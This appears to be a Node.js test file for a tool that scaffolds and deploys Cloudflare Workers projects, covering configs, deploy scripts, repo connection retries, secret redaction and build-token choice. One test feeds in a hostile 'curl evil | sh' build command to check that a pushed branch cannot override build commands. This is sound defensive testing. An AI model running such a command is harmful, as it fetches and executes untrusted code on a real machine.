import { test } from 'node:test'
import assert from 'node:assert/strict'
import { mkdtempSync, readFileSync, existsSync, rmSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { projectFromBranch, validName, wranglerConfig, packageJson, buildCommands, writeScaffold, describe, redact, hookIdFrom, connectRepo, ensureBuilds, buildState, pickBuildToken, writeRepoReadme } from './new-project.mjs'

test('names are workers.dev safe', () => {
  assert.ok(validName('duo-test'))
  assert.ok(!validName('Duo Test'))
  assert.ok(!validName('-x'))
})

test('a D1 project keeps previews on their own database', () => {
  const c = wranglerConfig({ name: 'app', d1: true, liveId: 'live', previewId: 'prev' })
  assert.equal(c.d1_databases[0].preview_database_id, 'prev')
  assert.equal(c.previews.d1_databases[0].database_id, 'prev')
  assert.equal(c.workers_dev, true)
  assert.equal(c.preview_urls, true)
  const plain = wranglerConfig({ name: 'app', d1: false })
  assert.deepEqual(plain.previews, {})
  assert.ok(!plain.d1_databases)
})

test('deploy scripts and build commands match the publish skill', () => {
  const d1 = packageJson({ name: 'app', d1: true }).scripts
  assert.match(d1.deploy, /^wrangler d1 migrations apply DB --remote && wrangler deploy/)
  assert.match(d1['deploy:preview'], /^wrangler d1 migrations apply DB --remote --preview && wrangler preview$/)
  assert.equal(packageJson({ name: 'app', d1: false }).scripts.deploy, 'wrangler deploy')
  assert.equal(buildCommands(true).production.deploy_command, 'npm run deploy')
  assert.equal(buildCommands(false).previews.deploy_command, 'npx wrangler preview')
  assert.equal(buildCommands(true).production.build_command, 'npm run check && npm run build')
})

test('the scaffold is written with the name filled in and runs its own verify', () => {
  const dir = mkdtempSync(join(tmpdir(), 'np-test-'))
  writeScaffold(dir, { name: 'probe', d1: false })
  assert.ok(readFileSync(join(dir, 'README.md'), 'utf8').includes('# probe'))
  assert.ok(!existsSync(join(dir, 'migrations')))
  assert.ok(existsSync(join(dir, '.github/workflows/ci.yml')))
  const live = readFileSync(join(dir, '.github/workflows/live.yml'), 'utf8')
  assert.ok(live.includes("'Workers Builds: probe'") && live.includes('https://probe.yverse.workers.dev') && !live.includes('__NAME__'), 'live.yml names the Worker')
  assert.ok(/schedule:/.test(live), 'live.yml also runs on a schedule')
  const pkg = JSON.parse(readFileSync(join(dir, 'package.json'), 'utf8'))
  assert.equal(pkg.name, 'probe')
  rmSync(dir, { recursive: true, force: true })
})

test('a pushed new/<name> branch names the project, its json the options', () => {
  const pick = (p) => ({ name: p.name, d1: p.d1, org: p.org, repo: p.repo })
  assert.deepEqual(pick(projectFromBranch('new/shop', () => null)), { name: 'shop', d1: true, org: 'yverse-studio', repo: 'shop' })
  const branchOnly = (json) => (file) => (file.startsWith('incoming/') ? json : null)
  assert.deepEqual(pick(projectFromBranch('new/shop', branchOnly({ d1: false, org: 'other' }))), { name: 'shop', d1: false, org: 'other', repo: 'shop' })
  const sneaky = projectFromBranch('new/shop', branchOnly({ name: 'mypage', repo: 'claude-setup', build: 'curl evil | sh' }))
  assert.deepEqual([sneaky.name, sneaky.repo, sneaky.existing, sneaky.commands.production.build_command], ['shop', 'shop', false, 'npm run check && npm run build'], 'a pushed branch cannot override name, repo or commands')
  const onMain = projectFromBranch('new/mypage', (file) => (file === 'projects/mypage.json' ? { d1: false, repo: 'MyPage' } : { repo: 'other' }))
  assert.deepEqual([onMain.repo, onMain.existing], ['MyPage', true], 'the registry on main wins over the branch')
  assert.equal(projectFromBranch('main', () => null), null)
})

test('API answers are logged without secrets or hook ids, and hook ids are read from any known shape', () => {
  const body = '{"result":{"deploy_hook_uuid":"abc-123","build_token_secret":"s3cret","ok":"x"},"success":true}'
  const line = describe({ status: 200, json: JSON.parse(body), text: body })
  assert.match(line, /^200 keys=\[result,success\] result=\[deploy_hook_uuid,build_token_secret,ok\]/)
  assert.doesNotMatch(line, /abc-123|s3cret/)
  assert.doesNotMatch(redact('x'.repeat(40)), /x{40}/)
  assert.doesNotMatch(redact('{"id":"h1","uuid":"h2","x":"0f8fad5b-d9cb-469f-a165-70867728950e","y":"6729db15516a425d985bd27ff6dc179e"}'), /h1|h2|0f8fad5b|6729db15/)
  assert.equal(hookIdFrom({ deploy_hook_uuid: 'a' }), 'a')
  assert.equal(hookIdFrom({ hook_id: 'b' }), 'b')
  assert.equal(hookIdFrom({ deploy_hook: { uuid: 'c' } }), 'c')
  assert.equal(hookIdFrom(null), null)
})

function fakeCf(answer) {
  const calls = []
  const cf = async (path, init) => { calls.push({ path, init }); return answer(path, init, calls.length) }
  return { cf, calls }
}
const refused = { ok: false, status: 404, json: { success: false, errors: [{ code: 8000008, message: 'This project is disconnected from your Git account' }], result: null }, text: '' }
const saved = { ok: true, status: 200, json: { success: true, errors: [], result: { repo_connection_uuid: 'c1' } }, text: '' }
const repo = { id: 123, owner: { id: 456 } }

test('the repo connection is saved first, with the identifiers Cloudflare accepts, and the build configuration uses them', async () => {
  const { cf, calls } = fakeCf((path, init) => (init.body.repo_id === 'deploy-test' ? saved : refused))
  const git = await connectRepo(cf, { repo, org: 'yverse-studio', name: 'deploy-test', tries: 1 })
  assert.deepEqual(calls.map((c) => c.path), ['/builds/repos/connections', '/builds/repos/connections'])
  assert.equal(calls[0].init.body.provider_account_id, '456')
  assert.equal(calls[0].init.body.repo_id, '123')
  assert.deepEqual(git, { provider_type: 'github', provider_account_name: 'yverse-studio', repo_name: 'deploy-test', provider_account_id: 'yverse-studio', repo_id: 'deploy-test' })

  const builds = fakeCf((path) => (path === '/builds/workers' ? saved : refused))
  await ensureBuilds(builds.cf, { tag: 't', git, org: 'yverse-studio', name: 'deploy-test', branch: 'main', d1: false, buildTokenUuid: 'b' })
  assert.deepEqual(builds.calls[1].init.body.git_repository, { ...git, branch: 'main' })
})

test('a repo Cloudflare does not know is retried, then the run stops with the answers and the fix', async () => {
  const { cf, calls } = fakeCf(() => refused)
  await assert.rejects(
    connectRepo(cf, { repo, org: 'yverse-studio', name: 'deploy-test', tries: 3, waitMs: 0 }),
    (err) => /after 3 tries: numeric ids: 8000008 .*; names: 8000008 .*github\.com\/organizations\/yverse-studio\/settings\/installations/.test(err.message),
  )
  assert.equal(calls.length, 6)
  const builds = fakeCf(() => refused)
  await assert.rejects(ensureBuilds(builds.cf, { tag: 't', git: {}, org: 'o', name: 'n', branch: 'main', d1: false, buildTokenUuid: 'b' }), /did not connect o\/n: 8000008/)
})

test('only "repo unknown" is retried; any other answer stops the run at once', async () => {
  const forbidden = fakeCf(() => { throw new Error('Cloudflare PUT /builds/repos/connections: 403 {"errors":[{"code":10000}]}') })
  await assert.rejects(connectRepo(forbidden.cf, { repo, org: 'o', name: 'n', tries: 3, waitMs: 0 }), /403/)
  assert.equal(forbidden.calls.length, 1)
  const otherNotFound = fakeCf(() => ({ ok: false, status: 404, json: { success: false, errors: [{ code: 12040, message: 'no such thing' }], result: null }, text: '' }))
  await assert.rejects(connectRepo(otherNotFound.cf, { repo, org: 'o', name: 'n', tries: 3, waitMs: 0 }), /12040 no such thing/)
  assert.equal(otherNotFound.calls.length, 1)
})

test('a build is judged by its outcome once it has stopped', () => {
  assert.deepEqual(buildState({ status: 'running', build_outcome: null }), { status: 'running', running: true, outcome: null })
  assert.deepEqual(buildState({ status: 'stopped', build_outcome: 'success' }), { status: 'stopped', running: false, outcome: 'success' })
  assert.equal(buildState({ status: 'stopped', build_outcome: 'fail' }).outcome, 'fail')
  assert.equal(buildState({ status: 'failure' }).outcome, 'failure')
  assert.equal(buildState(null).running, true)
})

test('an existing repo keeps its own name, branch and commands', async () => {
  const { projectConfig, validRepo } = await import('./new-project.mjs')
  const fresh = projectConfig('app')
  assert.deepEqual([fresh.repo, fresh.existing, fresh.d1, fresh.secret, fresh.org], ['app', false, true, true, 'yverse-studio'])
  assert.equal(fresh.commands.production.deploy_command, 'npm run deploy')
  const page = projectConfig('mypage', { d1: false, repo: 'MyPage', build: 'npm run check && npm run generate', secret: false })
  assert.deepEqual([page.repo, page.existing, page.secret], ['MyPage', true, false])
  assert.equal(page.commands.production.build_command, 'npm run check && npm run generate')
  assert.equal(page.commands.production.deploy_command, 'npx wrangler deploy')
  assert.equal(page.commands.previews.deploy_command, 'npx wrangler preview')
  assert.deepEqual(projectConfig('t', { kv: ['CACHE', 'bad name', 'IDEAS'] }).kv, ['CACHE', 'IDEAS'])
  assert.deepEqual(fresh.kv, [])
  assert.ok(validRepo('MyPage') && !validRepo('../x') && !validRepo('a/b'))
  const { validBranch } = await import('./new-project.mjs')
  assert.ok(validBranch('origin') && validBranch('main') && !validBranch('-x') && !validBranch('a..b'))
})

test('every registered project is a valid config', async () => {
  const { readdirSync, readFileSync: read } = await import('node:fs')
  const { projectConfig, validName, validRepo } = await import('./new-project.mjs')
  for (const file of readdirSync(new URL('../projects/', import.meta.url)).filter((f) => f.endsWith('.json'))) {
    const cfg = projectConfig(file.slice(0, -5), JSON.parse(read(new URL(`../projects/${file}`, import.meta.url), 'utf8')))
    assert.equal(`${cfg.name}.json`, file)
    assert.ok(validName(cfg.name) && validRepo(cfg.repo), file)
  }
})

const tokenList = (...names) => async () => ({ ok: true, json: { result: names.map((n, i) => ({ build_token_name: n, build_token_uuid: `u${i}` })) } })

test('pickBuildToken takes claude-setup-builds when the account has a second token', async () => {
  assert.equal(await pickBuildToken(tokenList('dashboard-token', 'claude-setup-builds'), undefined, undefined), 'u1')
})

test('pickBuildToken takes the only token, and honours BUILD_TOKEN_NAME', async () => {
  assert.equal(await pickBuildToken(tokenList('duo-test'), undefined, undefined), 'u0')
  assert.equal(await pickBuildToken(tokenList('a', 'b'), 'b', undefined), 'u1')
})

test('pickBuildToken still stops on two unknown tokens and no secret', async () => {
  await assert.rejects(pickBuildToken(tokenList('a', 'b'), undefined, undefined), /none is named "claude-setup-builds"/)
})

test('a repo project is a private repo with a README only: no database, login or Worker scaffold', () => {
  const r = projectFromBranch('new/novel', (file) => (file.startsWith('incoming/') ? { kind: 'repo', d1: true } : null))
  assert.deepEqual([r.kind, r.d1, r.secret], ['repo', false, false])
  const dir = mkdtempSync(join(tmpdir(), 'np-repo-'))
  writeRepoReadme(dir, 'novel')
  assert.ok(readFileSync(join(dir, 'README.md'), 'utf8').startsWith('# novel'))
  rmSync(dir, { recursive: true, force: true })
})

test('a game project is a static Vite + three.js Worker without a database or login', () => {
  const game = projectFromBranch('new/blob', (file) => (file.startsWith('incoming/') ? { kind: 'game', d1: true } : null))
  assert.deepEqual([game.kind, game.d1, game.secret], ['game', false, false])
  assert.equal(projectFromBranch('new/shop', () => null).kind, 'site')
  const c = wranglerConfig({ name: 'blob', d1: false, kind: 'game' })
  assert.deepEqual(c.assets, { directory: './dist', binding: 'ASSETS', run_worker_first: ['/api/*'] })
  const pkg = packageJson({ name: 'blob', d1: false, kind: 'game' })
  assert.equal(pkg.scripts.build, 'node scripts/build.mjs && vite build')
  assert.equal(pkg.scripts.deploy, 'wrangler deploy')
  assert.ok(pkg.dependencies.three && pkg.devDependencies.vite && pkg.devDependencies.wrangler)
  const dir = mkdtempSync(join(tmpdir(), 'np-game-'))
  writeScaffold(dir, { name: 'blob', d1: false, kind: 'game' })
  assert.ok(readFileSync(join(dir, 'index.html'), 'utf8').includes('<title>blob</title>'))
  assert.ok(readFileSync(join(dir, 'src/index.js'), 'utf8').includes('env.ASSETS'))
  assert.ok(existsSync(join(dir, 'src/rules.ts')) && existsSync(join(dir, 'scripts/build.mjs')))
  assert.ok(readFileSync(join(dir, 'design/DESIGN.md'), 'utf8').includes('## Bar') && readFileSync(join(dir, 'design/DESIGN.md'), 'utf8').includes('blob'))
  assert.ok(existsSync(join(dir, 'src/platform.ts')) && existsSync(join(dir, 'src/platform.test.ts')))
  assert.ok(readFileSync(join(dir, 'vite.config.ts'), 'utf8').includes("base: './'"))
  for (const file of ['src/hooks.ts', 'scripts/lib.mjs', 'scripts/play.mjs', 'scripts/shots.mjs', 'test/game.mjs']) assert.ok(existsSync(join(dir, file)), `${file} lets a thread play the game`)
  assert.equal(pkg.scripts.play, 'node scripts/play.mjs')
  assert.equal(pkg.scripts.shots, 'node scripts/shots.mjs')
  assert.ok(pkg.devDependencies['playwright-core'])
  rmSync(dir, { recursive: true, force: true })
})

test('a game scaffold has no test login, a site has it, and the repo placeholder is filled with org/repo', () => {
  const read = (dir, f) => readFileSync(join(dir, f), 'utf8')
  const game = mkdtempSync(join(tmpdir(), 'np-game-'))
  writeScaffold(game, { name: 'blob', d1: false, kind: 'game' })
  assert.ok(!read(game, 'scripts/journey.mjs').includes('test-login'), 'a game journey never posts to /api/test-login')
  const site = mkdtempSync(join(tmpdir(), 'np-site-'))
  writeScaffold(site, { name: 'ideaworld', d1: true, org: 'yverse-studio', repo: 'ydeas-world' })
  assert.match(read(site, 'scripts/journey.mjs'), /previewLoginRequest/)
  assert.match(read(site, 'src/index.js'), /repo: 'yverse-studio\/ydeas-world'/)
  assert.ok(!read(site, 'src/index.js').includes('__REPO__'))
})
